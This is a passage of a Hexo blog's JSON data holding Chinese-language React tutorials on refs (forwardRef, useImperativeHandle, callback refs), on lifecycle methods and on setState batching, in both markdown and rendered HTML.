class=\"title\">constructor</span>(<span class=\"params\">props</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">super</span>(props);</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.textInput = React.createRef();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">render</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;MyFunctionComponent ref=&#123;<span class=\"built_in\">this</span>.textInput&#125; /&gt;</span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>总之，在函数组件内部使用 ref 属性，只能指向一个 DOM 元素或 class 组件</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">CustomTextInput</span>(<span class=\"params\">props</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 这里必须声明 textInput，这样 ref 才可以引用它</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> textInput = useRef(<span class=\"literal\">null</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">handleClick</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    textInput.current.focus();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;div&gt;</span><br><span class=\"line\">      &lt;input</span><br><span class=\"line\">        type=<span class=\"string\">&quot;text&quot;</span></span><br><span class=\"line\">        ref=&#123;textInput&#125; /&gt;</span><br><span class=\"line\">      &lt;input</span><br><span class=\"line\">        type=<span class=\"string\">&quot;button&quot;</span></span><br><span class=\"line\">        value=<span class=\"string\">&quot;Focus the text input&quot;</span></span><br><span class=\"line\">        onClick=&#123;handleClick&#125;</span><br><span class=\"line\">      /&gt;</span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\">  );</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"3-React-forwardRef\"><a href=\"#3-React-forwardRef\" class=\"headerlink\" title=\"3. React.forwardRef()\"></a>3. React.forwardRef()</h3><p><code>React.forwardRef</code> 主要用于穿过父元素直接获取子元素的 ref。HOC（higher-order component）在 ref 使用上会存在问题，HOC 的 ref 是无法通过 props 进行传递的，因此无法直接获取被包裹组件（WrappedComponent），所以需要进行中转。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">HOCProps</span>(<span class=\"params\">WrappedComponent</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">HOCComponent</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"title\">constructor</span>(<span class=\"params\">props</span>)</span> &#123;</span><br><span class=\"line\">      <span class=\"built_in\">super</span>(props);</span><br><span class=\"line\">      <span class=\"built_in\">this</span>.setWrappedInstance = <span class=\"built_in\">this</span>.setWrappedInstance.bind(<span class=\"built_in\">this</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"title\">getWrappedInstance</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.wrappedInstance;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 实现 ref 的访问</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"title\">setWrappedInstance</span>(<span class=\"params\">ref</span>)</span> &#123;</span><br><span class=\"line\">      <span class=\"built_in\">this</span>.wrappedInstance = ref;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"title\">render</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">WrappedComponent</span> <span class=\"attr\">ref</span>=<span class=\"string\">&#123;this.setWrappedInstance&#125;</span> &#123;<span class=\"attr\">...this.props</span>&#125; /&gt;</span></span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> HOCComponent;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> App = HOCProps(Wrap);</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;App ref=&#123;<span class=\"function\">(<span class=\"params\">dom</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(dom); <span class=\"comment\">// 只能获取到 HOCComponent</span></span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(dom.getWrappedInstance()); <span class=\"comment\">// 通过中转后可以获取到 WrappedComponent</span></span><br><span class=\"line\">&#125;&#125; /&gt;</span><br></pre></td></tr></table></figure>\n\n<p>利用 forwardRef 能直接穿透 HOCComponent 获取到 WrappedComponent</p>\n<blockquote>\n<p>React.forwardRef 的原理其实非常简单，forwardRef 会生成 react 内部一种较为特殊的 Component。当进行创建更新操作时，会将 forwardRef 组件上的 props 与 ref 直接传递给提前注入的 render 函数，来生成 children。</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">HOCProps</span>(<span class=\"params\">WrappedComponent</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">HOCComponent</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"title\">render</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">const</span> &#123; forwardedRef, ...rest &#125; = <span class=\"built_in\">this</span>.props;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">WrappedComponent</span> <span class=\"attr\">ref</span>=<span class=\"string\">&#123;forwardedRef&#125;</span> &#123;<span class=\"attr\">...rest</span>&#125; /&gt;</span></span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> React.forwardRef(<span class=\"function\">(<span class=\"params\">props, ref</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">HOCComponent</span> <span class=\"attr\">forwardedRef</span>=<span class=\"string\">&#123;ref&#125;</span> &#123;<span class=\"attr\">...props</span>&#125;  /&gt;</span></span>;</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> App = HOCProps(Wrap);</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;App ref=&#123;<span class=\"function\">(<span class=\"params\">dom</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"comment\">// 可以直接获取 WrappedComponent</span></span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(dom);</span><br><span class=\"line\">&#125;&#125; /&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-React-useImperativeHandle\"><a href=\"#4-React-useImperativeHandle\" class=\"headerlink\" title=\"4. React.useImperativeHandle()\"></a>4. React.useImperativeHandle()</h3><p><code>useImperativeHandle(ref, createHandle, [deps])</code></p>\n<p><code>useImperativeHandle</code> 可以让你在使用 <code>ref</code> 时自定义暴露给父组件的实例值。<code>useImperativeHandle</code> 应当与 <code>forwardRef</code> 一起使用.</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">FancyInput</span>(<span class=\"params\">props, ref</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> inputRef = useRef();</span><br><span class=\"line\"></span><br><span class=\"line\">  useImperativeHandle(ref, <span class=\"function\">() =&gt;</span> (&#123;</span><br><span class=\"line\">    focus: <span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">      inputRef.current.focus();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;));</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">ref</span>=<span class=\"string\">&#123;inputRef&#125;</span> /&gt;</span></span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">FancyInput = forwardRef(FancyInput);</span><br></pre></td></tr></table></figure>\n\n<p>在本例中，渲染 <code>&lt;FancyInput ref=&#123;inputRef&#125; /&gt;</code> 的父组件可以调用 <code>inputRef.current.focus()</code>。</p>\n<h3 id=\"5-callback-ref\"><a href=\"#5-callback-ref\" class=\"headerlink\" title=\"5. callback ref\"></a>5. callback ref</h3><p>当 ref 属性接收一个回调函数时，会将其对应的 DOM元素 或 class 组件实例作为回调函数的参数调用回调函数。因此我们可以通过回调 Refs 的方式不依靠 Ref 对象，更灵活地控制要访问的元素或实例</p>\n<blockquote>\n<p>callback ref 采用了组件 render 过程中在闭包函数中分配 ref 的模式，通常会使用内联函数的形式，那么每次渲染都会重新创建，由于 react 会清理旧的 ref 然后设置新的，因此更新期间会调用两次，第一次为 null，如果在 callback 中带有业务逻辑的话，可能会出错，当然可以通过将 callback 定义成类成员函数并进行绑定的方式避免。</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyComponent</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">componentDidMount</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.myRef.focus();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">render</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">ref</span>=<span class=\"string\">&#123;(ele)</span> =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"xml\">      this.myRef = ele;</span></span><br><span class=\"line\"><span class=\"xml\">    &#125;&#125; /&gt;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"6-string-ref-不再建议使用\"><a href=\"#6-string-ref-不再建议使用\" class=\"headerlink\" title=\"6. string ref (不再建议使用)\"></a>6. string ref (不再建议使用)</h3><p>React 官方文档直接提出 <code>string ref</code> 将会在未来版本被移出，建议用户使用 <code>callback ref</code> 来代替</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// string ref</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyComponent</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">componentDidMount</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.refs.myRef.focus();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">render</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">ref</span>=<span class=\"string\">&quot;myRef&quot;</span> /&gt;</span></span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>string ref</code> 存在以下问题：</p>\n<ol>\n<li>存在性能问题：当 ref 定义为 string 时，需要 React 追踪当前正在渲染的组件，在 reconciliation 阶段，React Element 创建和更新的过程中，ref 会被封装为一个闭包函数，等待 commit 阶段被执行，这会对 React 的性能产生一些影响。</li>\n<li>使用 string ref 会造成 ref 挂载位置产生歧义</li>\n<li>string ref 无法被组合，例如一个第三方库的父组件已经给子组件传递了 ref，那么我们就无法再在子组件上添加 ref 了，而 callback ref 可完美解决此问题</li>\n<li>在根组件上使用无法生效</li>\n<li>对于静态类型较不友好，当使用 string ref 时，必须显式声明 refs 的类型，无法完成自动推导。</li>\n<li>编译器无法将 string ref 与其 refs 上对应的属性进行混淆，而使用 callback ref，可被混淆。</li>\n</ol>\n<h3 id=\"7-总结\"><a href=\"#7-总结\" class=\"headerlink\" title=\"7. 总结\"></a>7. 总结</h3><p>在 class 内部通过 <code>React.createRef()</code> 创建 Refs 对象，在函数组件内部通过 <code>React.useRef()</code> 创建 Refs 对象，如果被引用的组件为函数组件，则需要通过 <code>React.forwardRef()</code> 和 <code>React.useImperativeHandler()</code> 来作处理。</p>\n<ul>\n<li>父组件为 class 组件，子组件为 class 组件 —- 父组件中直接使用 <code>React.createRef()</code> 引用子组件实例</li>\n<li>父组件为 class 组件，子组件为 函数组件 —- 父组件中 <code>React.createRef()</code>，子组件使用 <code>React.forwardRef()</code> 和 <code>React.useImperativeHandler()</code></li>\n<li>父组件为 函数组件，子组件为 class 组件 —- 父组件中直接使用 <code>React.useRef()</code> 引用子组件实例</li>\n<li>父组件为 函数组件，子组件为 函数组件 —- 父组件中 <code>React.useRef()</code>，子组件使用 <code>React.forwardRef()</code> 和 <code>React.useImperativeHandler()</code></li>\n</ul>\n"},{"title":"React 生命周期","date":"2021-05-26T08:32:38.000Z","_content":"\n# React 生命周期\n\n**旧版本生命周期**\n![9913e024c3f2c4f65e3ef161b47ee06a.png](evernotecid://CE10AA85-EAB3-45B4-83E6-FF0E03D17746/appyinxiangcom/10250411/ENResource/p153)\n\n\n> React 17 会添加异步渲染的功能，即一种可被打断的生命周期，而可以被打断的阶段正是实际 dom 挂载之前的虚拟 dom 构建阶段，也就是要被去掉的三个生命周期 componentWillMount，componentWillReceiveProps 和 componentWillUpdate，故不推荐使用\n\n**新版本生命周期**\n![ead00979613189c0c49222aa0bec56c9.png](evernotecid://CE10AA85-EAB3-45B4-83E6-FF0E03D17746/appyinxiangcom/10250411/ENResource/p151)\n\n* 挂载阶段\n    * `constructor(props)`: 构造函数会最先被执行，通常在构造函数里初始化 state 对象或者给自定义方法绑定 this\n    * `static getDerivedStateFromProps(nextProps, prevState)`: 接收父组件传递过来的 props 和组件之前的状态，返回一个对象来更新 state ，或者返回 null 来表示接收到的 props 没有变化，不需要更新 state（配合 componentDidUpdate，可以覆盖 componentWillReceiveProps 的所有用法，在 React 16.4.0 版本中：在组件实例化、接收到新的 props 、组件状态更新时会被调用）\n    * `render()`:  render 函数是纯函数，返回需要渲染的内容\n    * `componentDidMount(prevProps, prevState, snapshot)`: 组件装载之后调用，此时我们可以获取到 DOM 节点并操作，比如对canvas，svg的操作，服务器请求，订阅都可以写在这个里面\n* 更新阶段\n    * `static getDerivedStateFromProps(nextProps, prevState)`: 此方法在更新和挂载阶段都会被调用\n    * `shouldComponentUpdate(nextProps, nextState)`: 通常利用此生命周期来优化React程序性能，返回一个布尔值，true 表示会触发重新渲染，false 表示不会触发重新渲染，默认返回 true, \n    * `render()`: 更新阶段也会触发此生命周期\n    * `getSnapshotBeforeUpdate(prevProps, prevState)`: 这个方法在 render 之后，componentDidUpdate 之前调用，有两个参数 prevProps 和 prevState，表示之前的 props 和之前的 state，这个函数有一个返回值，会作为第三个参数传给 componentDidUpdate，如果不想要返回值，可以返回null，此生命周期必须与 componentDidUpdate搭配使用\n    * `componentDidUpdate(prevProps, prevState, snapshot)`: 该方法在 getSnapshotBeforeUpdate 方法之后被调用，有三个参数 prevProps，prevState，snapshot，表示之前的 props，之前的 state，和 snapshot。第三个参数是 getSnapshotBeforeUpdate 返回的，如果触发某些回调函数时需要用到 DOM 元素的状态，则将对比或计算的过程迁移至 getSnapshotBeforeUpdate，然后在 componentDidUpdate 中统一触发回调或更新状态。\n* 卸载阶段\n    * `componentWillUnmount()`:  当我们的组件被卸载或者销毁了就会调用，我们可以在这个函数里去清除一些定时器，取消网络请求，清理无效的DOM元素等垃圾清理工作\n\n`componentDidUpdate` 钩子函数是在组件更新结束之后执行，在初始化 render 时不执行，如果在 componentDidMount 里面 setState 导致组件更新，组件更新后会执行 componentDidUpdate，此时在 componentDidUpdate 里面 setState 又会导致组件更新，造成成死循环了，如果要避免死循环，需要谨慎的在 componentDidUpdate 里面使用 setState，一般会在满足条件的情况下去使用 setState\n\n> 最常见的误解就是 `getDerivedStateFromProps` 和 `componentWillReceiveProps` 只会在 props “改变”时才会调用。实际上**只要父组件重新渲染时，这两个生命周期函数就会重新调用，不管 props 有没有“变化”**\n\n### 当外部的 props 改变时，如何再次执行请求数据？\n* 使用 `componentWillReceiveProps` （不推荐使用）\n* 使用 `getDerivedStateFromProps` + `componentDidUpdate`\n* 使用 `key` 重新加载组件\n\n### 当外部的 props 改变时，如何更改状态？\n* 使用 `getDerivedStateFromProps`\n* 使用 `componentDidUpdate`\n* 使用 `key` 重新加载组件\n\n### setState 是同步更新还是异步更新？\n\n说明：调用 `setState()` 后，然后立即取 `state` 的值，**可能**并不能得到最新的值，看上去像是异步执行的。\n\n答案: 有时表现出*异步*，有时表现出*同步*\n\n调用 setState --> 放入延迟队列 --> 比较 props、state 并更新 DOM\n\n> setState 的批量更新优化也是建立在“异步”（合成事件、钩子函数）之上的\n\n在 React 的 `setState` 函数实现中，会根据一个变量 `isBatchingUpdates` 判断是直接更新 `this.state` 还是**放到队列中延时更新**，而 `isBatchingUpdates` 默认是 `false`，表示 `setState` 会同步更新 `this.state`；但是，有一个函数 `batchedUpdates`，该函数会把 `isBatchingUpdates` 修改为 `true`，而当 React 在调用事件处理函数(合成事件)之前就会先调用这个 `batchedUpdates` 将`isBatchingUpdates` 修改为 `true`，这样由 React 控制的事件处理过程 `setState` 不会同步更新 `this.state`。其他情况下，如原生事件和 `setTimeout` 中不会批量更新。\n\n所以，在 React 应用中，如果在合成事件和钩子函数中调用 `setState` 会表现成异步，如果在原生事件和 `setTimeout` 中调用 `setState` 会表现成同步。\n\n","source":"_posts/React/React 生命周期.md","raw":"---\ntitle: React 生命周期\ncategories: React\ntags: [React]\ndate: 2021-05-26 16:32:38\n---\n\n# React 生命周期\n\n**旧版本生命周期**\n![9913e024c3f2c4f65e3ef161b47ee06a.png](evernotecid://CE10AA85-EAB3-45B4-83E6-FF0E03D17746/appyinxiangcom/10250411/ENResource/p153)\n\n\n> React 17 会添加异步渲染的功能，即一种可被打断的生命周期，而可以被打断的阶段正是实际 dom 挂载之前的虚拟 dom 构建阶段，也就是要被去掉的三个生命周期 componentWillMount，componentWillReceiveProps 和 componentWillUpdate，故不推荐使用\n\n**新版本生命周期**\n![ead00979613189c0c49222aa0bec56c9.png](evernotecid://CE10AA85-EAB3-45B4-83E6-FF0E03D17746/appyinxiangcom/10250411/ENResource/p151)\n\n* 挂载阶段\n    * `constructor(props)`: 构造函数会最先被执行，通常在构造函数里初始化 state 对象或者给自定义方法绑定 this\n    * `static getDerivedStateFromProps(nextProps, prevState)`: 接收父组件传递过来的 props 和组件之前的状态，返回一个对象来更新 state ，或者返回 null 来表示接收到的 props 没有变化，不需要更新 state（配合 componentDidUpdate，可以覆盖 componentWillReceiveProps 的所有用法，在 React 16.4.0 版本中：在组件实例化、接收到新的 props 、组件状态更新时会被调用）\n    * `render()`:  render 函数是纯函数，返回需要渲染的内容\n    * `componentDidMount(prevProps, prevState, snapshot)`: 组件装载之后调用，此时我们可以获取到 DOM 节点并操作，比如对canvas，svg的操作，服务器请求，订阅都可以写在这个里面\n* 更新阶段\n    * `static getDerivedStateFromProps(nextProps, prevState)`: 此方法在更新和挂载阶段都会被调用\n    * `shouldComponentUpdate(nextProps, nextState)`: 通常利用此生命周期来优化React程序性能，返回一个布尔值，true 表示会触发重新渲染，false 表示不会触发重新渲染，默认返回 true, \n    * `render()`: 更新阶段也会触发此生命周期\n    * `getSnapshotBeforeUpdate(prevProps, prevState)`: 这个方法在 render 之后，componentDidUpdate 之前调用，有两个参数 prevProps 和 prevState，表示之前的 props 和之前的 state，这个函数有一个返回值，会作为第三个参数传给 componentDidUpdate，如果不想要返回值，可以返回null，此生命周期必须与 componentDidUpdate搭配使用\n    * `componentDidUpdate(prevProps, prevState, snapshot)`: 该方法在 getSnapshotBeforeUpdate 方法之后被调用，有三个参数 prevProps，prevState，snapshot，表示之前的 props，之前的 state，和 snapshot。第三个参数是 getSnapshotBeforeUpdate 返回的，如果触发某些回调函数时需要用到 DOM 元素的状态，则将对比或计算的过程迁移至 getSnapshotBeforeUpdate，然后在 componentDidUpdate 中统一触发回调或更新状态。\n* 卸载阶段\n    * `componentWillUnmount()`:  当我们的组件被卸载或者销毁了就会调用，我们可以在这个函数里去清除一些定时器，取消网络请求，清理无效的DOM元素等垃圾清理工作\n\n`componentDidUpdate` 钩子函数是在组件更新结束之后执行，在初始化 render 时不执行，如果在 componentDidMount 里面 setState 导致组件更新，组件更新后会执行 componentDidUpdate，此时在 componentDidUpdate 里面 setState 又会导致组件更新，造成成死循环了，如果要避免死循环，需要谨慎的在 componentDidUpdate 里面使用 setState，一般会在满足条件的情况下去使用 setState\n\n> 最常见的误解就是 `getDerivedStateFromProps` 和 `componentWillReceiveProps` 只会在 props “改变”时才会调用。实际上**只要父组件重新渲染时，这两个生命周期函数就会重新调用，不管 props 有没有“变化”**\n\n### 当外部的 props 改变时，如何再次执行请求数据？\n* 使用 `componentWillReceiveProps` （不推荐使用）\n* 使用 `getDerivedStateFromProps` + `componentDidUpdate`\n* 使用 `key` 重新加载组件\n\n### 当外部的 props 改变时，如何更改状态？\n* 使用 `getDerivedStateFromProps`\n* 使用 `componentDidUpdate`\n* 使用 `key` 重新加载组件\n\n### setState 是同步更新还是异步更新？\n\n说明：调用 `setState()` 后，然后立即取 `state` 的值，**可能**并不能得到最新的值，看上去像是异步执行的。\n\n答案: 有时表现出*异步*，有时表现出*同步*\n\n调用 setState --> 放入延迟队列 --> 比较 props、state 并更新 DOM\n\n> setState 的批量更新优化也是建立在“异步”（合成事件、钩子函数）之上的\n\n在 React 的 `setState` 函数实现中，会根据一个变量 `isBatchingUpdates` 判断是直接更新 `this.state` 还是**放到队列中延时更新**，而 `isBatchingUpdates` 默认是 `false`，表示 `setState` 会同步更新 `this.state`；但是，有一个函数 `batchedUpdates`，该函数会把 `isBatchingUpdates` 修改为 `true`，而当 React 在调用事件处理函数(合成事件)之前就会先调用这个 `batchedUpdates` 将`isBatchingUpdates` 修改为 `true`，这样由 React 控制的事件处理过程 `setState` 不会同步更新 `this.state`。其他情况下，如原生事件和 `setTimeout` 中不会批量更新。\n\n所以，在 React 应用中，如果在合成事件和钩子函数中调用 `setState` 会表现成异步，如果在原生事件和 `setTimeout` 中调用 `setState` 会表现成同步。\n\n","slug":"React/React 生命周期","published":1,"updated":"2021-06-07T11:49:04.148Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckpmjxu2m0006df6r8c5p76tj","content":"<h1 id=\"React-生命周期\"><a href=\"#React-生命周期\" class=\"headerlink\" title=\"React 生命周期\"></a>React 生命周期</h1><p><strong>旧版本生命周期</strong><br><img src=\"evernotecid://CE10AA85-EAB3-45B4-83E6-FF0E03D17746/appyinxiangcom/10250411/ENResource/p153\" alt=\"9913e024c3f2c4f65e3ef161b47ee06a.png\"></p>\n<blockquote>\n<p>React 17 会添加异步渲染的功能，即一种可被打断的生命周期，而可以被打断的阶段正是实际 dom 挂载之前的虚拟 dom 构建阶段，也就是要被去掉的三个生命周期 componentWillMount，componentWillReceiveProps 和 componentWillUpdate，故不推荐使用</p>\n</blockquote>\n<p><strong>新版本生命周期</strong><br><img src=\"evernotecid://CE10AA85-EAB3-45B4-83E6-FF0E03D17746/appyinxiangcom/10250411/ENResource/p151\" alt=\"ead00979613189c0c49222aa0bec56c9.png\"></p>\n<ul>\n<li>挂载阶段<ul>\n<li><code>constructor(props)</code>: 构造函数会最先被执行，通常在构造函数里初始化 state 对象或者给自定义方法绑定 this</li>\n<li><code>static getDerivedStateFromProps(nextProps, prevState)</code>: 接收父组件传递过来的 props 和组件之前的状态，返回一个对象来更新 state ，或者返回 null 来表示接收到的 props 没有变化，不需要更新 state（配合 componentDidUpdate，可以覆盖 componentWillReceiveProps 的所有用法，在 React 16.4.0 版本中：在组件实例化、接收到新的 props 、组件状态更新时会被调用）</li>\n<li><code>render()</code>:  render 函数是纯函数，返回需要渲染的内容</li>\n<li><code>componentDidMount(prevProps, prevState, snapshot)</code>: 组件装载之后调用，此时我们可以获取到 DOM 节点并操作，比如对canvas，svg的操作，服务器请求，订阅都可以写在这个里面</li>\n</ul>\n</li>\n<li>更新阶段<ul>\n<li><code>static getDerivedStateFromProps(nextProps, prevState)</code>: 此方法在更新和挂载阶段都会被调用</li>\n<li><code>shouldComponentUpdate(nextProps, nextState)</code>: 通常利用此生命周期来优化React程序性能，返回一个布尔值，true 表示会触发重新渲染，false 表示不会触发重新渲染，默认返回 true, </li>\n<li><code>render()</code>: 更新阶段也会触发此生命周期</li>\n<li><code>getSnapshotBeforeUpdate(prevProps, prevState)</code>: 这个方法在 render 之后，componentDidUpdate 之前调用，有两个参数 prevProps 和 prevState，表示之前的 props 和之前的 state，这个函数有一个返回值，会作为第三个参数传给 componentDidUpdate，如果不想要返回值，可以返回null，此生命周期必须与 componentDidUpdate搭配使用</li>\n<li><code>componentDidUpdate(prevProps, prevState, snapshot)</code>: 该方法在 getSnapshotBeforeUpdate 方法之后被调用，有三个参数 prevProps，prevState，snapshot，表示之前的 props，之前的 state，和 snapshot。第三个参数是 getSnapshotBeforeUpdate 返回的，如果触发某些回调函数时需要用到 DOM 元素的状态，则将对比或计算的过程迁移至 getSnapshotBeforeUpdate，然后在 componentDidUpdate 